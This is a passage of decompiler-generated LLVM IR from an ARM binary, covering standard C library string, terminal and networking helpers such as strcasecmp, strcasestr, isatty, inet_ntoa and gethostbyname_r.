  store i32 %v3_11b48, i32* @r4, align 4
  ret i32 %v0_11c1c

; uselistorder directives
  uselistorder i32 %v4_11be0, { 1, 2, 0 }
  uselistorder i32 %v1_11bd4, { 1, 0, 2 }
  uselistorder i32 %v1_11b74, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11b4c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_11c1c, { 1, 0 }
  uselistorder label %dec_label_pc_11c0c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_11bc8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %bb8, %entry
  %v8_11ca43 = phi i32 [ %v8_11ca4, %bb8 ], [ 0, %entry ]
  %v0_11c98 = phi i32 [ %v1_11c98, %bb8 ], [ %arg2, %entry ]
  %v0_11c9c = phi i32 [ %v1_11c9c, %bb8 ], [ %tmp, %entry ]
  %v9_11c40 = icmp eq i32 %v0_11c9c, %v0_11c98
  br i1 %v9_11c40, label %dec_label_pc_11c40._crit_edge, label %dec_label_pc_11c48

dec_label_pc_11c40._crit_edge:                    ; preds = %dec_label_pc_11c40
  %.pre = inttoptr i32 %v0_11c98 to i8*
  br label %bb8

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c40
  %v1_11c4c = inttoptr i32 %v0_11c9c to i8*
  %v2_11c4c = load i8, i8* %v1_11c4c, align 1
  %v3_11c4c = zext i8 %v2_11c4c to i32
  %v1_11c50 = inttoptr i32 %v0_11c98 to i8*
  %v2_11c50 = load i8, i8* %v1_11c50, align 1
  %v3_11c50 = zext i8 %v2_11c50 to i32
  %v2_11c54 = load i32, i32* bitcast (i32** @global_var_234ec.418 to i32*), align 4
  %v2_11c58 = mul nuw nsw i32 %v3_11c4c, 2
  %v2_11c5c = mul nuw nsw i32 %v3_11c50, 2
  %v2_11c60 = add i32 %v2_11c5c, %v2_11c54
  %v2_11c64 = add i32 %v2_11c54, %v2_11c58
  %v1_11c68 = add i32 %v2_11c64, 1
  %v2_11c68 = inttoptr i32 %v1_11c68 to i8*
  %v3_11c68 = load i8, i8* %v2_11c68, align 1
  %v4_11c68 = zext i8 %v3_11c68 to i32
  %v1_11c6c = add i32 %v2_11c60, 1
  %v2_11c6c = inttoptr i32 %v1_11c6c to i8*
  %v3_11c6c = load i8, i8* %v2_11c6c, align 1
  %v4_11c6c = zext i8 %v3_11c6c to i32
  %v3_11c70 = inttoptr i32 %v2_11c60 to i8*
  %v4_11c70 = load i8, i8* %v3_11c70, align 1
  %v6_11c70 = zext i8 %v4_11c70 to i32
  %v3_11c74 = inttoptr i32 %v2_11c64 to i8*
  %v4_11c74 = load i8, i8* %v3_11c74, align 1
  %v6_11c74 = zext i8 %v4_11c74 to i32
  %v3_11c78 = mul nuw i32 %v4_11c6c, 16777216
  %v3_11c7c = mul nuw i32 %v4_11c68, 16777216
  %v4_11c80 = sdiv i32 %v3_11c7c, 65536
  %v5_11c80 = or i32 %v6_11c74, %v4_11c80
  %v4_11c84 = sdiv i32 %v3_11c78, 65536
  %v5_11c84 = or i32 %v4_11c84, %v6_11c70
  %v2_11c88 = sub nsw i32 %v5_11c80, %v5_11c84
  %v9_11c88 = icmp eq i32 %v5_11c80, %v5_11c84
  br i1 %v9_11c88, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_11c48
  ret i32 %v2_11c88

bb8:                                              ; preds = %dec_label_pc_11c40._crit_edge, %dec_label_pc_11c48
  %v1_11c90.pre-phi = phi i8* [ %.pre, %dec_label_pc_11c40._crit_edge ], [ %v1_11c4c, %dec_label_pc_11c48 ]
  %v8_11ca4 = phi i32 [ %v8_11ca43, %dec_label_pc_11c40._crit_edge ], [ %v2_11c88, %dec_label_pc_11c48 ]
  %v2_11c90 = load i8, i8* %v1_11c90.pre-phi, align 1
  %v2_11c94 = icmp eq i8 %v2_11c90, 0
  %v1_11c98 = add i32 %v0_11c98, 1
  %v1_11c9c = add i32 %v0_11c9c, 1
  store i32 %v1_11c9c, i32* @lr, align 4
  br i1 %v2_11c94, label %dec_label_pc_11ca4, label %dec_label_pc_11c40

dec_label_pc_11ca4:                               ; preds = %bb8
  ret i32 %v8_11ca4

; uselistorder directives
  uselistorder i32 %v1_11c9c, { 1, 0 }
  uselistorder i32 %v2_11c88, { 1, 0 }
  uselistorder i32 %v5_11c84, { 1, 0 }
  uselistorder i32 %v5_11c80, { 1, 0 }
  uselistorder i32 %v0_11c98, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_11cc016 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_11cc0.outer

dec_label_pc_11cc0.outer:                         ; preds = %dec_label_pc_11d28, %entry
  %v0_11cd4.ph = phi i32 [ %v1_11d28, %dec_label_pc_11d28 ], [ %tmp, %entry ]
  %v2_11cc017 = load i8, i8* %v1_11cc016, align 1
  %v2_11cc419 = icmp eq i8 %v2_11cc017, 0
  br i1 %v2_11cc419, label %dec_label_pc_11cd4, label %dec_label_pc_11cdc

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cc0.backedge, %dec_label_pc_11cc0.outer
  ret i32 %v0_11cd4.ph

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cc0.outer, %dec_label_pc_11cc0.backedge
  %v1_11ccc25.in = phi i32 [ %v1_11ccc25, %dec_label_pc_11cc0.backedge ], [ %arg2, %dec_label_pc_11cc0.outer ]
  %v2_11cc023 = phi i8 [ %v2_11cc0, %dec_label_pc_11cc0.backedge ], [ %v2_11cc017, %dec_label_pc_11cc0.outer ]
  %v2_11cc824.in.in = phi i8 [ %v2_11cc0, %dec_label_pc_11cc0.backedge ], [ %v2_11cc017, %dec_label_pc_11cc0.outer ]
  %v0_11ce422 = phi i32 [ %v1_11ce4, %dec_label_pc_11cc0.backedge ], [ %v0_11cd4.ph, %dec_label_pc_11cc0.outer ]
  %v1_11ccc25 = add i32 %v1_11ccc25.in, 1
  %v1_11cdc = inttoptr i32 %v0_11ce422 to i8*
  %v2_11cdc = load i8, i8* %v1_11cdc, align 1
  %v9_11ce0 = icmp eq i8 %v2_11cc023, %v2_11cdc
  %v1_11ce4 = add i32 %v0_11ce422, 1
  br i1 %v9_11ce0, label %dec_label_pc_11cc0.backedge, label %dec_label_pc_11cf0

dec_label_pc_11cc0.backedge:                      ; preds = %dec_label_pc_11cdc, %dec_label_pc_11cf0
  %v1_11cc0 = inttoptr i32 %v1_11ccc25 to i8*
  %v2_11cc0 = load i8, i8* %v1_11cc0, align 1
  %v2_11cc4 = icmp eq i8 %v2_11cc0, 0
  br i1 %v2_11cc4, label %dec_label_pc_11cd4, label %dec_label_pc_11cdc

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cdc
  %v2_11cc824.in = zext i8 %v2_11cc824.in.in to i32
  %v3_11cdc = zext i8 %v2_11cdc to i32
  %v2_11ce8 = mul nuw nsw i32 %v3_11cdc, 2
  %v2_11cc824 = mul nuw nsw i32 %v2_11cc824.in, 2
  %v2_11cf4 = load i32, i32* bitcast (i32** @global_var_234ec.418 to i32*), align 4
  %v2_11cf8 = add i32 %v2_11cf4, %v2_11ce8
  %v2_11cfc = add i32 %v2_11cf4, %v2_11cc824
  %v1_11d00 = add i32 %v2_11cfc, 1
  %v2_11d00 = inttoptr i32 %v1_11d00 to i8*
  %v3_11d00 = load i8, i8* %v2_11d00, align 1
  %v4_11d00 = zext i8 %v3_11d00 to i32
  %v1_11d04 = add i32 %v2_11cf8, 1
  %v2_11d04 = inttoptr i32 %v1_11d04 to i8*
  %v3_11d04 = load i8, i8* %v2_11d04, align 1
  %v4_11d04 = zext i8 %v3_11d04 to i32
  %v3_11d08 = inttoptr i32 %v2_11cf8 to i8*
  %v4_11d08 = load i8, i8* %v3_11d08, align 1
  %v6_11d08 = zext i8 %v4_11d08 to i32
  %v3_11d0c = inttoptr i32 %v2_11cfc to i8*
  %v4_11d0c = load i8, i8* %v3_11d0c, align 1
  %v6_11d0c = zext i8 %v4_11d0c to i32
  %v3_11d10 = mul nuw i32 %v4_11d00, 16777216
  %v3_11d14 = mul nuw i32 %v4_11d04, 16777216
  %v4_11d18 = sdiv i32 %v3_11d10, 65536
  %v5_11d18 = or i32 %v6_11d0c, %v4_11d18
  %v4_11d1c = sdiv i32 %v3_11d14, 65536
  %v5_11d1c = or i32 %v4_11d1c, %v6_11d08
  %v9_11d20 = icmp eq i32 %v5_11d18, %v5_11d1c
  br i1 %v9_11d20, label %dec_label_pc_11cc0.backedge, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11cf0
  %v1_11d28 = add i32 %v0_11cd4.ph, 1
  %v2_11d2c = icmp eq i8 %v2_11cdc, 0
  br i1 %v2_11d2c, label %dec_label_pc_11d3c, label %dec_label_pc_11cc0.outer

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d28
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_11cc0, { 2, 1, 0 }
  uselistorder i8 %v2_11cdc, { 0, 2, 1 }
  uselistorder i32 %v0_11ce422, { 1, 0 }
  uselistorder i32 %v0_11cd4.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11cc0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_29558.421 to i32), i32* @r2, align 4
  %v0_11d4c = call i32 @strtok_r()
  %v0_11d50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d50, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_11d50 = load i32, i32* @r2, align 4
  %v2_11d50 = load i32, i32* @r8, align 4
  %v3_11d50 = load i32, i32* @r5, align 4
  %v8_11d50 = ashr i32 %v2_11d50, %v3_11d50
  %v9_11d50 = and i32 %v8_11d50, %v1_11d50
  store i32 %v9_11d50, i32* @sb, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11d4c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_11d58 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_11d58, i32* @r1, align 4
  %v0_11d60 = call i32 @__GI_tcgetattr()
  %v1_11d64 = sub i32 1, %v0_11d60
  %v2_11d64 = icmp ult i32 %v0_11d60, 2
  br i1 %v2_11d64, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11d70 = phi i32 [ %v1_11d64, %entry ], [ 0, %bb ]
  ret i32 %v5_11d70

; uselistorder directives
  uselistorder i32 %v0_11d60, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11d74 = load i32, i32* @r4, align 4
  %v6_11d74 = load i32, i32* @r5, align 4
  %v2_11d78 = ptrtoint i32* %stack_var_-56 to i32
  %v0_11d7c = load i32, i32* @r1, align 4
  store i32 %v0_11d7c, i32* %r6.global-to-local, align 4
  %v0_11d88 = load i32, i32* @r0, align 4
  %v3_11d88 = call i32 @ioctl(i32 %v0_11d88, i32 21505, i32 %v2_11d78)
  store i32 %v3_11d88, i32* %r7.global-to-local, align 4
  %v2_11d8c = icmp eq i32 %v3_11d88, 0
  %v2_11d94 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_11d94, i32* @r1, align 4
  %v0_11d9c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_11d8c, label %dec_label_pc_11da4, label %dec_label_pc_11dd0

dec_label_pc_11da4:                               ; preds = %entry
  %v1_11d9c = add i32 %v0_11d9c, 17
  %v4_11dac = zext i8 %tmp to i32
  store i32 %v4_11dac, i32* @r5, align 4
  %v2_11db0 = load i32, i32* %stack_var_-56, align 4
  %v1_11db4 = inttoptr i32 %v0_11d9c to i32*
  store i32 %v2_11db0, i32* %v1_11db4, align 4
  %v3_11db4 = add i32 %v0_11d9c, 4
  %v4_11db4 = inttoptr i32 %v3_11db4 to i32*
  %v5_11db4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11db4, i32* %v4_11db4, align 4
  %v6_11db4 = add i32 %v0_11d9c, 8
  %v7_11db4 = inttoptr i32 %v6_11db4 to i32*
  %v8_11db4 = load i32, i32* @lr, align 4
  store i32 %v8_11db4, i32* %v7_11db4, align 4
  %v0_11db8 = load i32, i32* @r4, align 4
  %v1_11db8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11db8 = add i32 %v1_11db8, 12
  %v3_11db8 = inttoptr i32 %v2_11db8 to i32*
  store i32 %v0_11db8, i32* %v3_11db8, align 4
  %v0_11dbc = load i32, i32* @r5, align 4
  %v1_11dbc = trunc i32 %v0_11dbc to i8
  %v2_11dbc = load i32, i32* %r6.global-to-local, align 4
  %v3_11dbc = add i32 %v2_11dbc, 16
  %v4_11dbc = inttoptr i32 %v3_11dbc to i8*
  store i8 %v1_11dbc, i8* %v4_11dbc, align 1
  %v4_11dc0 = call i32 @__GI_mempcpy(i32 %v1_11d9c, i32 %v2_11d94, i32 19, i32 %v2_11db0)
  %v0_11dc4 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_11dcc = inttoptr i32 %v4_11dc0 to i8*
  %v3_11dcc = call i32 @__GI_memset(i8* %v2_11dcc, i32 %v0_11dc4)
  br label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %entry, %dec_label_pc_11da4
  %v0_11dd0 = phi i32 [ %v3_11d88, %entry ], [ %v0_11dc4, %dec_label_pc_11da4 ]
  store i32 %v3_11d74, i32* @r4, align 4
  store i32 %v6_11d74, i32* @r5, align 4
  ret i32 %v0_11dd0

; uselistorder directives
  uselistorder i32 %v0_11d9c, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11dd0, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11dfc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11dfc
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11e0c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11e10 = urem i32 %tmp1, 256
  %v5_11e10 = or i32 %v4_11e10, %v1_11e0c
  ret i32 %v5_11e10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11e34 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11e34
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11e44 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11e48 = urem i32 %tmp1, 256
  %v5_11e48 = or i32 %v4_11e48, %v1_11e44
  ret i32 %v5_11e48

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_11e50 = load i32, i32* @r4, align 4
  %v6_11e50 = load i32, i32* @r5, align 4
  %v9_11e50 = load i32, i32* @r6, align 4
  %v0_11e54 = load i32, i32* @r0, align 4
  %v2_11e74 = call i32 @llvm.bswap.i32(i32 %v0_11e54)
  %v0_11e78 = load i32, i32* @r1, align 4
  %v1_11e78 = add i32 %v0_11e78, 15
  store i32 %v1_11e78, i32* @ip, align 4
  br label %dec_label_pc_11ea4

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11ea4
  %v1_11ea8 = urem i32 %v0_11eb8, 256
  %v5_11e8c = inttoptr i32 %v0_11ec4 to i8*
  %v6_11e8c = call i32 @_uintmaxtostr(i8* %v5_11e8c, i32 %v1_11ea8, i32 0, i32 -10, i32 0)
  %v0_11e90 = load i32, i32* @r6, align 4
  %v2_11e90 = icmp eq i32 %v0_11e90, 0
  %v1_11e94 = add i32 %v6_11e8c, -1
  store i32 %v1_11e94, i32* @ip, align 4
  br i1 %v2_11e90, label %dec_label_pc_11ea4.backedge, label %bb

dec_label_pc_11ea4.backedge:                      ; preds = %bb, %dec_label_pc_11e84
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_11e94, %dec_label_pc_11e84 ]
  %v0_11ea4.pre = load i32, i32* @r5, align 4
  %v0_11ea8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11ea4

bb:                                               ; preds = %dec_label_pc_11e84
  %v4_11e9c = inttoptr i32 %v0_11e90 to i8*
  store i8 46, i8* %v4_11e9c, align 1
  %storemerge.pre.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_11ea4.backedge

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11ea4.backedge, %entry
  %v0_11ec4 = phi i32 [ %v1_11e78, %entry ], [ %storemerge.pre, %dec_label_pc_11ea4.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_11ea4.backedge ]
  %v0_11eb8 = phi i32 [ %v2_11e74, %entry ], [ %v0_11ea8.pre, %dec_label_pc_11ea4.backedge ]
  %v0_11ebc = phi i32 [ 0, %entry ], [ %v0_11ea4.pre, %dec_label_pc_11ea4.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_11ea4 = icmp eq i32 %v0_11ebc, 3
  store i1 %v7_11ea4, i1* @cpsr_z, align 1
  %v3_11eb8 = udiv i32 %v0_11eb8, 256
  store i32 %v3_11eb8, i32* @r4, align 4
  %v1_11ebc = add i32 %v0_11ebc, 1
  store i32 %v1_11ebc, i32* @r5, align 4
  %v7_11ec0 = icmp sgt i32 %v0_11ebc, 3
  br i1 %v7_11ec0, label %dec_label_pc_11ec4, label %dec_label_pc_11e84

dec_label_pc_11ec4:                               ; preds = %dec_label_pc_11ea4
  %v1_11ec4 = add i32 %v0_11ec4, 1
  store i32 %v3_11e50, i32* @r4, align 4
  store i32 %v6_11e50, i32* @r5, align 4
  store i32 %v9_11e50, i32* @r6, align 4
  ret i32 %v1_11ec4

; uselistorder directives
  uselistorder i32 %v0_11ebc, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2955c.424 to i32), i32* @r1, align 4
  %v0_11ed4 = call i32 @__GI_inet_ntoa_r()
  %v0_11ed8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ed8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_11ed8 = load i32, i32* @ip, align 4
  %v3_11ed8 = load i32, i32* @r5, align 4
  %v8_11ed8 = ashr i32 %v2_11ed8, %v3_11ed8
  %v9_11ed8 = and i32 %v8_11ed8, %arg1
  store i32 %v9_11ed8, i32* @sb, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11ed4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_11ee0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_11ee8 = load i32, i32* @r0, align 4
  %v2_11ee8 = inttoptr i32 %v0_11ee8 to i8*
  %v3_11ee8 = call i32 @inet_aton(i8* %v2_11ee8, i32 %v2_11ee0)
  %v2_11eec = icmp eq i32 %v3_11ee8, 0
  br i1 %v2_11eec, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_11ef4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11efc = phi i32 [ -1, %entry ], [ %v3_11ef4, %bb ]
  ret i32 %v5_11efc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_11f00 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11f0c = call i32 @__GI___h_errno_location()
  %v2_11f10 = ptrtoint i32* %stack_var_-12 to i32
  %v0_11f1c = load i32, i32* @r4, align 4
  %v7_11f2c = call i32 @gethostbyname_r(i32 %v0_11f1c, i32* nonnull @global_var_29738.426, i32 ptrtoint (i32* @global_var_2956c.428 to i32), i32 460, i32 %v2_11f10, i32 %v0_11f0c)
  %v3_11f30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_11f00, i32* @r4, align 4
  ret i32 %v3_11f30
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_11f44 = load i32, i32* @r5, align 4
  %v9_11f44 = load i32, i32* @r6, align 4
  %v12_11f44 = load i32, i32* @r7, align 4
  %v15_11f44 = load i32, i32* @r8, align 4
  %v18_11f44 = load i32, i32* @sb, align 4
  %v21_11f44 = load i32, i32* @sl, align 4
  %v24_11f44 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_11f54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f54, i32* @fp, align 4
  %v2_11f54 = icmp eq i32 %v0_11f54, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_11f64 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_11f64, align 4
  br i1 %v2_11f54, label %bb, label %dec_label_pc_11f70

bb:                                               ; preds = %entry
  %v1_11f68 = load i32, i32* %r0.global-to-local, align 4
  %v2_11f68 = add i32 %v1_11f68, 22
  store i32 %v2_11f68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12294

dec_label_pc_11f70:                               ; preds = %entry
  %v0_11f70 = call i32 @__errno_location()
  store i32 %v0_11f70, i32* %r0.global-to-local, align 4
  %v3_11f74 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_11f74, i32* %ip.global-to-local, align 4
  %v1_11f78 = inttoptr i32 %v0_11f70 to i32*
  %v2_11f78 = load i32, i32* %v1_11f78, align 4
  store i32 %v2_11f78, i32* @r8, align 4
  %v0_11f7c = load i32, i32* @r6, align 4
  store i32 %v0_11f7c, i32* %v1_11f78, align 4
  %v0_11f80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_11f70, i32* @r5, align 4
  %v0_11f90 = load i32, i32* @fp, align 4
  store i32 %v0_11f90, i32* %r0.global-to-local, align 4
  %v0_11f94 = load i32, i32* @sl, align 4
  store i32 %v0_11f94, i32* %r2.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r7, align 4
  store i32 %v0_11f98, i32* %r3.global-to-local, align 4
  %v0_11f9c = load i32, i32* @r4, align 4
  %v7_11fa4 = call i32 @__get_hosts_byname_r(i32 %v0_11f90, i32 2, i32 %v0_11f94, i32 %v0_11f98, i32 %v0_11f9c, i32 %v0_11f80, i32 %arg6)
  store i32 %v7_11fa4, i32* %r0.global-to-local, align 4
  %v2_11fa8 = icmp eq i32 %v7_11fa4, 0
  br i1 %v2_11fa8, label %dec_label_pc_12294, label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11f70
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_11fb4 = inttoptr i32 %arg6 to i32*
  %v2_11fb4 = load i32, i32* %v1_11fb4, align 4
  store i32 %v2_11fb4, i32* %r3.global-to-local, align 4
  %v7_11fb8 = icmp eq i32 %v2_11fb4, 1
  br i1 %v7_11fb8, label %dec_label_pc_11fdc, label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11fb0
  %v7_11fc0 = icmp eq i32 %v2_11fb4, 4
  br i1 %v7_11fc0, label %dec_label_pc_11fdc, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11fc0
  %v3_11fc8 = icmp eq i32 %v2_11fb4, -1
  br i1 %v3_11fc8, label %dec_label_pc_11fd0, label %dec_label_pc_12294

dec_label_pc_11fd0:                               ; preds = %dec_label_pc_11fc8
  %v0_11fd0 = load i32, i32* @r5, align 4
  %v1_11fd0 = inttoptr i32 %v0_11fd0 to i32*
  %v2_11fd0 = load i32, i32* %v1_11fd0, align 4
  store i32 %v2_11fd0, i32* %r3.global-to-local, align 4
  %v7_11fd4 = icmp eq i32 %v2_11fd0, 2
  br i1 %v7_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_12294

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fd0, %dec_label_pc_11fc0, %dec_label_pc_11fb0
  %v0_11fdc = load i32, i32* @r7, align 4
  %v1_11fdc = sub i32 0, %v0_11fdc
  %v1_11fe0 = urem i32 %v1_11fdc, 4
  store i32 %v1_11fe0, i32* %r3.global-to-local, align 4
  %v2_11fe0 = icmp eq i32 %v1_11fe0, 0
  %v0_11fe4 = load i32, i32* @r8, align 4
  %v1_11fe4 = load i32, i32* @r5, align 4
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i32*
  store i32 %v0_11fe4, i32* %v2_11fe4, align 4
  %v0_12004.pre = load i32, i32* @r4, align 4
  br i1 %v2_11fe0, label %dec_label_pc_11ffc, label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fdc
  %v1_11fec = load i32, i32* %r3.global-to-local, align 4
  %v2_11fec = sub i32 %v0_12004.pre, %v1_11fec
  %v3_11fec = icmp ult i32 %v0_12004.pre, %v1_11fec
  br i1 %v3_11fec, label %dec_label_pc_12290, label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11fec
  store i32 %v2_11fec, i32* @r4, align 4
  %v0_11ff8 = load i32, i32* @r7, align 4
  %v2_11ff8 = add i32 %v0_11ff8, %v1_11fec
  store i32 %v2_11ff8, i32* @r7, align 4
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fdc, %dec_label_pc_11ff4
  %v0_12004 = phi i32 [ %v2_11fec, %dec_label_pc_11ff4 ], [ %v0_12004.pre, %dec_label_pc_11fdc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_11fb4, align 4
  %tmp31 = icmp ult i32 %v0_12004, 4
  br i1 %tmp31, label %dec_label_pc_12290, label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %dec_label_pc_11ffc
  %v0_12010 = load i32, i32* @r4, align 4
  %v1_12010 = add i32 %v0_12010, -4
  store i32 %v1_12010, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_12010, 8
  br i1 %tmp32, label %dec_label_pc_12290, label %dec_label_pc_1201c

dec_label_pc_1201c:                               ; preds = %dec_label_pc_12010
  %v1_1201c = add i32 %v0_12010, -12
  store i32 %v1_1201c, i32* %r3.global-to-local, align 4
  %v0_12020 = load i32, i32* @r7, align 4
  %v1_12020 = add i32 %v0_12020, 4
  store i32 %v1_12020, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_1202c = inttoptr i32 %v1_12020 to i32*
  store i32 %v0_12020, i32* %v3_1202c, align 4
  %v0_12030 = load i32, i32* @r5, align 4
  %v1_12030 = load i32, i32* @sb, align 4
  %v2_12030 = add i32 %v1_12030, 4
  %v3_12030 = inttoptr i32 %v2_12030 to i32*
  store i32 %v0_12030, i32* %v3_12030, align 4
  %tmp33 = icmp ult i32 %v1_1201c, 32
  br i1 %tmp33, label %dec_label_pc_12290, label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_1201c
  %v0_12038 = load i32, i32* @r4, align 4
  %v1_12038 = add i32 %v0_12038, -44
  store i32 %v1_12038, i32* @r8, align 4
